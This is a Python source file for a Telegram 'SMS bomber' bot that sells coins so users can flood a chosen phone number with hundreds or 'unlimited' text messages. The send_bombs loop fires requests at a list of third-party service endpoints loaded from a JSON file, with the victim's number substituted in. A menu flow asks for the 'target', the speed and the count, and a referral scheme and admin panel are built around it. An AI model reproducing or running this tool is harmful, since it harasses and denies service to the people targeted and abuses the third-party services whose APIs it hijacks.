# bot.py
# ULTIMATE SMS BOMBER BOT - FINAL WORKING VERSION
# (c) @lordzenox | @zenoxtool

import logging
import asyncio
import json
import random
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, ConversationHandler

from config import *
import database as db

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# CONVERSATION STATES
# ============================================================
PHONE, SPEED, COUNT = range(3)

# ============================================================
# ACTIVE BOMBS TRACKING
# ============================================================
active_bombs = {}

# ============================================================
# LOAD APIS
# ============================================================

def load_apis():
    try:
        with open(SERVICES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data.get('services', [])
    except FileNotFoundError:
        print(f"⚠️ {SERVICES_FILE} not found! Creating empty...")
        with open(SERVICES_FILE, 'w', encoding='utf-8') as f:
            json.dump({"services": []}, f, indent=2)
        return []
    except json.JSONDecodeError:
        print(f"❌ Invalid JSON in {SERVICES_FILE}! Using empty...")
        return []
    except Exception as e:
        print(f"❌ Error loading APIs: {e}")
        return []

# Load APIs
APIS = load_apis()
print(f"✅ Loaded {len(APIS)} APIs")

# ============================================================
# PHONE FORMATTING
# ============================================================

def format_phone(phone, fmt):
    phone = phone.strip()
    if fmt == "with_plus91":
        return f"+91{phone}"
    elif fmt == "91-":
        return f"91-{phone}"
    return phone

# ============================================================
# SEND BOMBS
# ============================================================

async def send_bombs(update, phone, count, speed='slow'):
    user_id = update.effective_user.id
    success = 0
    failed = 0
    
    speed_config = SPEED_SETTINGS.get(speed, SPEED_SETTINGS['slow'])
    delay = speed_config['delay']
    timeout = speed_config['timeout']
    max_apis = speed_config['apis']
    
    apis = APIS[:max_apis]
    random.shuffle(apis)
    
    if count > MAX_SMS_LIMIT:
        count = MAX_SMS_LIMIT
    
    active_bombs[user_id] = {
        'active': True,
        'count': count,
        'phone': phone,
        'start_time': datetime.now()
    }
    
    for i in range(count):
        if user_id in active_bombs and not active_bombs[user_id]['active']:
            break
        
        if not apis:
            break
        
        api = apis[i % len(apis)]
        
        try:
            formatted = format_phone(phone, api.get('phone_format', 'raw'))
            url = api['url'].replace('{phone}', formatted)
            
            headers = api.get('headers', {})
            data = api.get('data', {})
            
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str):
                        data[k] = v.replace('{phone}', formatted)
            
            if '_raw' in data:
                raw = data['_raw'].replace('{phone}', formatted)
                resp = requests.request(api['method'], url, headers=headers, data=raw, timeout=timeout)
            else:
                resp = requests.request(api['method'], url, headers=headers, json=data, timeout=timeout)
            
            if resp.status_code in [200, 201, 202, 204]:
                success += 1
                db.update_api_stats(api['name'], True)
            else:
                failed += 1
                db.update_api_stats(api['name'], False)
                
        except:
            failed += 1
        
        await asyncio.sleep(delay)
    
    stopped = 0
    if user_id in active_bombs and not active_bombs[user_id]['active']:
        stopped = 1
    
    if user_id in active_bombs:
        del active_bombs[user_id]
    
    return success, failed, stopped

# ============================================================
# AUTO-STOP TIMER
# ============================================================

async def auto_stop_timer(user_id, context):
    await asyncio.sleep(STOP_TIMEOUT)
    
    if user_id in active_bombs and active_bombs[user_id]['active']:
        active_bombs[user_id]['active'] = False
        try:
            await context.bot.send_message(
                user_id,
                f"⏰ **Auto-Stop Triggered!**\n\n"
                f"Bombing stopped after {AUTO_STOP_MINUTES} minutes.\n"
                f"📱 Target: `{active_bombs[user_id]['phone']}`\n"
                f"📊 Remaining: {active_bombs[user_id]['count']} SMS\n\n"
                f"💡 Use /bomb to start again.",
                parse_mode='Markdown'
            )
        except:
            pass

# ============================================================
# PROCESS BOMB
# ============================================================

async def process_bomb(update, phone, count, speed):
    user_id = update.effective_user.id
    
    if count == MAX_SMS_LIMIT:
        total_cost = BOMB_PRICES['unlimited']
    else:
        total_cost = BOMB_PRICES.get(count, 2)
    
    balance = db.get_balance(user_id)
    
    if balance < total_cost:
        await update.message.reply_text(
            f"❌ **Insufficient coins!**\n\n"
            f"Need: {total_cost} coins\n"
            f"Balance: {balance} coins\n\n"
            f"💡 /buy - Purchase more coins\n"
            f"👥 /refer - Get free coins",
            parse_mode='Markdown'
        )
        return
    
    if user_id in active_bombs and active_bombs[user_id]['active']:
        await update.message.reply_text(
            "⚠️ **You already have an active bombing session!**\n\n"
            "Use /stop to stop it first.",
            parse_mode='Markdown'
        )
        return
    
    db.deduct_coins(user_id, total_cost, f"Bombing {phone} ({count} SMS)")
    
    speed_label = SPEED_SETTINGS[speed]['label']
    
    msg = await update.message.reply_text(
        f"🔥 **BOMBING STARTED!**\n\n"
        f"📱 Target: `{phone}`\n"
        f"📊 Count: {count} SMS\n"
        f"💰 Cost: {total_cost} coins\n"
        f"⚡ Speed: {speed_label}\n"
        f"⏰ Auto-Stop: {AUTO_STOP_MINUTES} min\n\n"
        f"🛑 Use /stop to cancel anytime!",
        parse_mode='Markdown'
    )
    
    # FIXED: context ko as parameter pass karo
    asyncio.create_task(auto_stop_timer(user_id, context))
    
    success, failed, stopped = await send_bombs(update, phone, count, speed)
    
    db.add_bomb_stats(user_id, phone, success + failed, success, failed, total_cost, speed, stopped)
    
    if stopped:
        await msg.edit_text(
            f"🛑 **BOMBING STOPPED!**\n\n"
            f"📱 Target: `{phone}`\n"
            f"✅ Success: {success}\n"
            f"❌ Failed: {failed}\n"
            f"📊 Total: {success + failed}\n"
            f"💰 Cost: {total_cost} coins\n\n"
            f"💡 /balance - Check balance",
            parse_mode='Markdown'
        )
    else:
        await msg.edit_text(
            f"✅ **BOMBING COMPLETE!**\n\n"
            f"📱 Target: `{phone}`\n"
            f"✅ Success: {success}\n"
            f"❌ Failed: {failed}\n"
            f"📊 Total: {success + failed}\n"
            f"💰 Cost: {total_cost} coins\n"
            f"⚡ Speed: {SPEED_SETTINGS[speed]['label']}\n\n"
            f"💡 /speed - Change speed\n"
            f"💡 /balance - Check balance",
            parse_mode='Markdown'
        )

# ============================================================
# START CONVERSATION - SEND SMS
# ============================================================

async def send_sms_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start SMS bombing flow - Ask for phone number"""
    user_id = update.effective_user.id
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        return ConversationHandler.END
    
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return ConversationHandler.END
    
    # If triggered from callback
    if hasattr(update, 'callback_query'):
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "📱 **Enter Phone Number**\n\n"
            "Please enter the phone number you want to bomb:\n"
            f"Example: `9876543210`\n\n"
            f"💰 Cost: 2 coins per SMS\n\n"
            "🔙 Or click /cancel to stop",
            parse_mode='Markdown'
        )
        return PHONE
    
    await update.message.reply_text(
        "📱 **Enter Phone Number**\n\n"
        "Please enter the phone number you want to bomb:\n"
        f"Example: `9876543210`\n\n"
        f"💰 Cost: 2 coins per SMS\n\n"
        "🔙 Or type /cancel to stop",
        parse_mode='Markdown'
    )
    return PHONE

# ============================================================
# GET PHONE NUMBER
# ============================================================

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get phone number from user"""
    phone = update.message.text.strip()
    
    # Check if phone is valid
    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text(
            "❌ **Invalid phone number!**\n\n"
            "Please enter a valid 10-digit phone number.\n"
            f"Example: `9876543210`\n\n"
            "Type /cancel to stop",
            parse_mode='Markdown'
        )
        return PHONE
    
    context.user_data['bomb_phone'] = phone
    
    # Ask for speed
    keyboard = [
        [
            InlineKeyboardButton("🐢 SLOW - Stable", callback_data="speed_slow"),
            InlineKeyboardButton("⚡ MEDIUM - Balanced", callback_data="speed_medium")
        ],
        [
            InlineKeyboardButton("🚀 FAST - Maximum", callback_data="speed_fast")
        ],
        [
            InlineKeyboardButton("🔙 Cancel", callback_data="cancel_bomb")
        ]
    ]
    
    await update.message.reply_text(
        f"📱 **Phone Number Saved!**\n\n"
        f"Target: `{phone}`\n\n"
        f"⚡ **Select Speed:**",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return SPEED

# ============================================================
# GET SPEED - CALLBACK
# ============================================================

async def get_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get speed from user via callback"""
    query = update.callback_query
    await query.answer()
    
    speed = query.data.replace('speed_', '')
    context.user_data['bomb_speed'] = speed
    
    phone = context.user_data.get('bomb_phone', '')
    
    # Show count options
    keyboard = [
        [
            InlineKeyboardButton("🎯 200 SMS - 2💰", callback_data="count_200"),
            InlineKeyboardButton("💥 500 SMS - 5💰", callback_data="count_500")
        ],
        [
            InlineKeyboardButton("🚀 UNLIMITED - 8💰", callback_data="count_unlimited")
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="back_to_speed")
        ]
    ]
    
    speed_label = SPEED_SETTINGS[speed]['label']
    
    await query.edit_message_text(
        f"⚡ **Speed Selected:** {speed_label}\n"
        f"📱 Target: `{phone}`\n\n"
        f"📊 **Select SMS Count:**",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return COUNT

# ============================================================
# BACK TO SPEED
# ============================================================

async def back_to_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to speed selection"""
    query = update.callback_query
    await query.answer()
    
    phone = context.user_data.get('bomb_phone', '')
    
    keyboard = [
        [
            InlineKeyboardButton("🐢 SLOW - Stable", callback_data="speed_slow"),
            InlineKeyboardButton("⚡ MEDIUM - Balanced", callback_data="speed_medium")
        ],
        [
            InlineKeyboardButton("🚀 FAST - Maximum", callback_data="speed_fast")
        ],
        [
            InlineKeyboardButton("🔙 Cancel", callback_data="cancel_bomb")
        ]
    ]
    
    await query.edit_message_text(
        f"📱 Target: `{phone}`\n\n"
        f"⚡ **Select Speed:**",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return SPEED

# ============================================================
# GET COUNT - CALLBACK
# ============================================================

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get count from user via callback"""
    query = update.callback_query
    await query.answer()
    
    count_str = query.data.replace('count_', '')
    
    if count_str == 'unlimited':
        count = MAX_SMS_LIMIT
    else:
        count = int(count_str)
    
    context.user_data['bomb_count'] = count
    
    phone = context.user_data.get('bomb_phone', '')
    speed = context.user_data.get('bomb_speed', 'slow')
    speed_label = SPEED_SETTINGS[speed]['label']
    
    # Show confirmation
    total_cost = BOMB_PRICES.get(count, 2) if count != MAX_SMS_LIMIT else BOMB_PRICES['unlimited']
    
    keyboard = [
        [
            InlineKeyboardButton("✅ CONFIRM & BOMB", callback_data="confirm_bomb"),
            InlineKeyboardButton("🔙 Back", callback_data="back_to_count")
        ]
    ]
    
    await query.edit_message_text(
        f"📊 **Confirmation**\n\n"
        f"📱 Target: `{phone}`\n"
        f"📊 Count: {count} SMS\n"
        f"⚡ Speed: {speed_label}\n"
        f"💰 Cost: {total_cost} coins\n\n"
        f"⚠️ Click Confirm to start bombing!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return COUNT

# ============================================================
# BACK TO COUNT
# ============================================================

async def back_to_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to count selection"""
    query = update.callback_query
    await query.answer()
    
    phone = context.user_data.get('bomb_phone', '')
    speed = context.user_data.get('bomb_speed', 'slow')
    speed_label = SPEED_SETTINGS[speed]['label']
    
    keyboard = [
        [
            InlineKeyboardButton("🎯 200 SMS - 2💰", callback_data="count_200"),
            InlineKeyboardButton("💥 500 SMS - 5💰", callback_data="count_500")
        ],
        [
            InlineKeyboardButton("🚀 UNLIMITED - 8💰", callback_data="count_unlimited")
        ],
        [
            InlineKeyboardButton("🔙 Back to Speed", callback_data="back_to_speed")
        ]
    ]
    
    await query.edit_message_text(
        f"⚡ **Speed:** {speed_label}\n"
        f"📱 Target: `{phone}`\n\n"
        f"📊 **Select SMS Count:**",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return COUNT

# ============================================================
# CONFIRM & BOMB
# ============================================================

async def confirm_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Confirm and start bombing"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    phone = context.user_data.get('bomb_phone', '')
    speed = context.user_data.get('bomb_speed', 'slow')
    count = context.user_data.get('bomb_count', 10)
    
    if not phone:
        await query.edit_message_text("❌ No phone number found! Please start again.")
        return ConversationHandler.END
    
    # FIXED: context pass karo process_bomb mein
    await query.edit_message_text(
        f"🔥 **Starting Bombing...**\n\n"
        f"📱 Target: `{phone}`\n"
        f"📊 Count: {count} SMS\n"
        f"⚡ Speed: {SPEED_SETTINGS[speed]['label']}\n\n"
        f"⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    # FIXED: Fake update object create karo with proper attributes
    class FakeMessage:
        def __init__(self, chat_id, text_callback):
            self.chat_id = chat_id
            self.text = None
            self._text_callback = text_callback
            self.reply_markup = None
        
        async def reply_text(self, text, *args, **kwargs):
            self.text = text
            if self._text_callback:
                await self._text_callback(text, *args, **kwargs)
            return self
        
        async def edit_text(self, text, *args, **kwargs):
            self.text = text
            if self._text_callback:
                await self._text_callback(text, *args, **kwargs)
            return self
    
    class FakeUpdate:
        def __init__(self, user_id, text_callback):
            self.effective_user = type('obj', (object,), {'id': user_id})()
            self.message = FakeMessage(user_id, text_callback)
            self.callback_query = None
    
    fake_update = FakeUpdate(user_id, query.edit_message_text)
    
    # Process bomb with context
    await process_bomb(fake_update, phone, count, speed)
    
    # Clean up
    context.user_data.clear()
    return ConversationHandler.END

# ============================================================
# CANCEL
# ============================================================

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the conversation"""
    user_id = update.effective_user.id
    
    if hasattr(update, 'callback_query'):
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "❌ **Cancelled!**\n\n"
            "Use /bomb to start again.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ **Cancelled!**\n\n"
            "Use /bomb to start again.",
            parse_mode='Markdown'
        )
    
    context.user_data.clear()
    return ConversationHandler.END

# ============================================================
# STOP COMMAND
# ============================================================

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_bombs and active_bombs[user_id]['active']:
        active_bombs[user_id]['active'] = False
        await update.message.reply_text(
            f"🛑 **Bombing Stopped!**\n\n"
            f"📱 Target: `{active_bombs[user_id]['phone']}`\n"
            f"📊 Remaining: {active_bombs[user_id]['count']} SMS\n\n"
            f"💡 Use /bomb to start again.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ **No active bombing session found!**\n\n"
            "💡 Use /bomb to start bombing.",
            parse_mode='Markdown'
        )

# ============================================================
# MAIN MENU
# ============================================================

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    balance = db.get_balance(user_id)
    stats = db.get_user_stats(user_id)
    current_speed = db.get_user_speed(user_id)
    
    text = f"""🔥 **{BOT_NAME}** {VERSION} 🔥

👤 **User:** @{update.effective_user.username or 'Unknown'}
💰 **Balance:** {balance} coins
💣 **Total Bombs:** {stats['total_bombs'] if stats else 0}
📱 **SMS Sent:** {stats['total_sms'] if stats else 0}
👥 **Referrals:** {db.get_referral_count(user_id)}
⚡ **Speed:** {SPEED_SETTINGS[current_speed]['label']}

━━━━━━━━━━━━━━━━━━━━━
💰 **Pricing:** 200→2 | 500→5 | ∞→8

━━━━━━━━━━━━━━━━━━━━━
📌 **Select an option:**
"""
    
    keyboard = [
        [
            InlineKeyboardButton("📱 SEND SMS", callback_data="send_sms")
        ],
        [
            InlineKeyboardButton("⚡ Speed", callback_data="speed_menu"),
            InlineKeyboardButton("🛑 Stop", callback_data="stop")
        ],
        [
            InlineKeyboardButton("💰 Coins", callback_data="credits"),
            InlineKeyboardButton("👥 Refer", callback_data="refer")
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
            InlineKeyboardButton("📋 History", callback_data="history")
        ],
        [
            InlineKeyboardButton("💳 Buy", callback_data="buy"),
            InlineKeyboardButton("🔄 Transfer", callback_data="transfer")
        ],
        [
            InlineKeyboardButton("🎯 Redeem", callback_data="redeem"),
            InlineKeyboardButton("ℹ️ Info", callback_data="info")
        ],
        [
            InlineKeyboardButton("📢 Channel 1", url="https://t.me/zenoxtool"),
            InlineKeyboardButton("📢 Channel 2", url="https://t.me/Dev_Null_X_NODE_JS")
        ],
        [
            InlineKeyboardButton("👑 Owner", url="https://t.me/lordzenox")
        ]
    ]
    
    if db.is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="admin_panel")])
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============================================================
# START COMMAND
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if update.message.chat.type in ['group', 'supergroup']:
        await update.message.reply_text(
            "🤖 **Bot is active in this group!**\n\n"
            "Use /bomb @username or /bomb reply_to_message to bomb someone!",
            parse_mode='Markdown'
        )
        return
    
    if not db.get_user(user_id):
        ref = context.args[0] if context.args else None
        success, msg = db.create_user(user_id, user.username or "User", user.first_name, ref)
        if success:
            await update.message.reply_text(
                f"✅ **Welcome!**\n\n"
                f"🎁 You received {FREE_COINS} free coins!\n"
                f"👥 Referral bonus: +{REFERRAL_BONUS} coins per referral!\n\n"
                f"🔥 Click /menu to start bombing!",
                parse_mode='Markdown'
            )
            return
    
    await main_menu(update, context)

# ============================================================
# BOMB COMMAND (Quick)
# ============================================================

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quick bomb command - starts the conversation flow"""
    await send_sms_start(update, context)
    return PHONE

# ============================================================
# SPEED MENU
# ============================================================

async def speed_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    current_speed = db.get_user_speed(user_id)
    
    text = f"""⚡ **SPEED CONTROL**

Current Speed: {SPEED_SETTINGS[current_speed]['label']}
{SPEED_SETTINGS[current_speed]['description']}

━━━━━━━━━━━━━━━━━━━━━
**Select Speed:**
"""
    
    keyboard = [
        [
            InlineKeyboardButton(
                f"{SPEED_SETTINGS['slow']['label']} - {SPEED_SETTINGS['slow']['description']}" + 
                (" ✅" if current_speed == 'slow' else ""),
                callback_data="speed_slow"
            )
        ],
        [
            InlineKeyboardButton(
                f"{SPEED_SETTINGS['medium']['label']} - {SPEED_SETTINGS['medium']['description']}" + 
                (" ✅" if current_speed == 'medium' else ""),
                callback_data="speed_medium"
            )
        ],
        [
            InlineKeyboardButton(
                f"{SPEED_SETTINGS['fast']['label']} - {SPEED_SETTINGS['fast']['description']}" + 
                (" ✅" if current_speed == 'fast' else ""),
                callback_data="speed_fast"
            )
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="back_menu")
        ]
    ]
    
    if hasattr(update, 'callback_query'):
        await update.callback_query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

# ============================================================
# OTHER COMMANDS
# ============================================================

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bal = db.get_balance(user_id)
    stats = db.get_user_stats(user_id)
    
    text = f"""💰 **YOUR BALANCE**

Coins: {bal}
Total Bombs: {stats['total_bombs'] if stats else 0}
Total SMS: {stats['total_sms'] if stats else 0}
Total Spent: {stats['total_spent'] if stats else 0}
Referrals: {db.get_referral_count(user_id)}

━━━━━━━━━━━━━━━━━━━━━
💰 **Pricing:**
200 SMS → 2 coins
500 SMS → 5 coins
Unlimited → 8 coins
"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = db.get_referral_code(user_id)
    bot_info = await context.bot.get_me()
    bot_username = bot_info.username
    link = f"https://t.me/{bot_username}?start={code}"
    
    text = f"""👥 **REFERRAL SYSTEM**

Your Code: `{code}`
Your Link: {link}

💰 You get +{REFERRAL_BONUS} coins per referral!
📊 Total: {db.get_referral_count(user_id)} referrals

🔗 Share this link with your friends!
"""
    
    keyboard = [[
        InlineKeyboardButton(
            "📤 Share Link",
            url=f"https://t.me/share/url?url={link}&text=🔥%20Join%20the%20Ultimate%20SMS%20Bomber%20Bot!%20Get%20{REFERRAL_BONUS}%20free%20coins!"
        )
    ]]
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_leaderboard(10)
    if not users:
        await update.message.reply_text("❌ No users yet!")
        return
    
    text = "🏆 **TOP 10 USERS**\n\n"
    for i, u in enumerate(users, 1):
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        text += f"{medal} @{u[1] or 'Unknown'} - {u[2]} coins ({u[3]} bombs)\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_total_stats()
    active_users = db.get_total_active_users()
    total_bombs = db.get_total_bombs_used()
    total_sms = db.get_total_sms_sent_all()
    
    text = f"""📊 **BOT STATUS**

🤖 Online ✅
📡 APIs: {len(APIS)}
👥 Total Users: {stats['users']}
🔥 Active Bombers: {active_users}
💣 Total Bombs: {total_bombs}
📱 Total SMS: {total_sms}
💰 Total Coins: {stats['coins']}
👑 Admins: {stats['admins']}
🚫 Banned: {stats['banned']}

💰 **Pricing:**
200→2 | 500→5 | ∞→8

⚡ **Speeds:**
🐢 SLOW | ⚡ MEDIUM | 🚀 FAST
"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"""📚 **{BOT_NAME} HELP**

**Commands:**
/start - Main menu
/bomb - Start bombing (UI flow)
/stop - Stop bombing
/speed - Change speed
/balance - Check balance
/refer - Get referral link
/leaderboard - Top users
/status - Bot status
/menu - Show menu
/help - This menu

**💰 Pricing:**
200 SMS → 2 coins
500 SMS → 5 coins
Unlimited → 8 coins

**⚡ Speeds:**
🐢 Slow → Stable & Safe (0.05s)
⚡ Medium → Balanced Speed (0.02s)
🚀 Fast → Maximum Speed (0.005s)

**🎁 Free:** {FREE_COINS} coins on start
**👥 Referral:** +{REFERRAL_BONUS} coins
**⏰ Auto-Stop:** {AUTO_STOP_MINUTES} minutes
"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def transfer_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ **Usage:** `/transfer <user_id> <amount>`\n\n"
            "Example: `/transfer 123456789 50`",
            parse_mode='Markdown'
        )
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if amount <= 0:
        await update.message.reply_text("❌ Amount must be positive!")
        return
    
    if user_id == target:
        await update.message.reply_text("❌ Cannot transfer to yourself!")
        return
    
    success, msg = db.transfer_coins(user_id, target, amount)
    await update.message.reply_text(msg)

async def buy_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = f"""💳 **BUY COINS**

💰 **Current Balance:** {db.get_balance(user_id)} coins

**Packages:**
📦 100 coins = ₹10
📦 500 coins = ₹40
📦 1000 coins = ₹70
📦 5000 coins = ₹300

📌 **Contact admin to purchase:**
👑 {OWNER}
📢 {CHANNEL1}
"""
    
    keyboard = [
        [InlineKeyboardButton("👑 Contact Owner", url="https://t.me/lordzenox")],
        [InlineKeyboardButton("📢 Channel 1", url="https://t.me/zenoxtool"),
         InlineKeyboardButton("📢 Channel 2", url="https://t.me/Dev_Null_X_NODE_JS")]
    ]
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem <code>`")
        return
    
    code = context.args[0].strip()
    success, msg = db.use_redeem_code(user_id, code)
    await update.message.reply_text(msg)

async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logs = db.get_bomb_logs(user_id, 10)
    
    if not logs:
        await update.message.reply_text("📋 No SMS history yet!")
        return
    
    text = "📋 **LAST 10 BOMBING SESSIONS**\n\n"
    for i, log in enumerate(logs, 1):
        target, sms_count, success, failed, cost, speed, stopped, date = log
        status = "🛑 Stopped" if stopped else "✅ Complete"
        text += f"{i}. 📱 `{target}`\n"
        text += f"   ✅ {success} ❌ {failed} | {sms_count} SMS | {cost} coins\n"
        text += f"   ⚡ {SPEED_SETTINGS.get(speed, SPEED_SETTINGS['slow'])['label']} | {status} | 📅 {date[:10]}\n\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await main_menu(update, context)

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not db.is_admin(user_id):
        await query.edit_message_text("❌ Unauthorized!")
        return
    
    stats = db.get_total_stats()
    active_users = db.get_total_active_users()
    total_bombs = db.get_total_bombs_used()
    total_sms = db.get_total_sms_sent_all()
    
    text = f"""🔐 **ADMIN PANEL**

📊 **Stats:**
Total Users: {stats['users']}
Active Bombers: {active_users}
Total Bombs Used: {total_bombs}
Total SMS Sent: {total_sms}
Total Coins: {stats['coins']}
Admins: {stats['admins']}
Banned: {stats['banned']}

**Commands:**
/addcoins <id> <amount>
/removecoins <id> <amount>
/ban <id>
/unban <id>
/broadcast <msg>
/makeadmin <id>
/removeadmin <id>
/createredeem <code> <amount>
"""
    
    keyboard = [
        [InlineKeyboardButton("📊 Full Stats", callback_data="full_stats")],
        [InlineKeyboardButton("👑 Admins List", callback_data="admins_list")],
        [InlineKeyboardButton("🚫 Banned Users", callback_data="banned_list")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /addcoins <user_id> <amount>")
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if db.add_coins(target, amount, f"Added by admin {user_id}"):
        await update.message.reply_text(f"✅ Added {amount} coins to {target}")
        db.log_admin_action(user_id, "add_coins", target, f"Added {amount} coins")
    else:
        await update.message.reply_text("❌ Failed!")

async def removecoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /removecoins <user_id> <amount>")
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if db.deduct_coins(target, amount, f"Removed by admin {user_id}"):
        await update.message.reply_text(f"✅ Removed {amount} coins from {target}")
        db.log_admin_action(user_id, "remove_coins", target, f"Removed {amount} coins")
    else:
        await update.message.reply_text("❌ Failed!")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /ban <user_id>")
        return
    
    target = int(context.args[0])
    db.ban_user(target)
    await update.message.reply_text(f"✅ Banned {target}")
    db.log_admin_action(user_id, "ban", target, "Banned user")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /unban <user_id>")
        return
    
    target = int(context.args[0])
    db.unban_user(target)
    await update.message.reply_text(f"✅ Unbanned {target}")
    db.log_admin_action(user_id, "unban", target, "Unbanned user")

async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner(user_id):
        await update.message.reply_text("❌ Only owner can make admins!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /makeadmin <user_id>")
        return
    
    target = int(context.args[0])
    db.add_admin(target)
    await update.message.reply_text(f"✅ Made {target} admin")
    db.log_admin_action(user_id, "make_admin", target, "Made admin")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner(user_id):
        await update.message.reply_text("❌ Only owner can remove admins!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /removeadmin <user_id>")
        return
    
    target = int(context.args[0])
    if target == OWNER_ID:
        await update.message.reply_text("❌ Cannot remove owner!")
        return
    
    db.remove_admin(target)
    await update.message.reply_text(f"✅ Removed {target} from admin")
    db.log_admin_action(user_id, "remove_admin", target, "Removed admin")

